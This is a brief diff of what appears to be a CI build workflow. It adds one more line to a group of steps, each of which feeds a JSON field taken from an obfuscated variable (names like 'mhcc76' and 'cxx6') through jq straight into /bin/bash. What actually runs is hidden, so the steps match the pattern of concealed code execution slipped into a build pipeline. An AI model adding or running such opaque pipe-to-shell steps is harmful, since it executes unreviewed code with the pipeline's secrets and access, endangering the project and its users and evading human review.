@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$rhnc476" | jq -r .ayro57 | /bin/bash
           echo $hke7 | jq -r .tg42689 | /bin/bash
           echo $y21 | jq -r .xtqkn02894 | /bin/bash
+          printf '%s' "$mhcc76" | jq -r .cxx6 | /bin/bash
 
       - name: Upload artifact
         if: always()
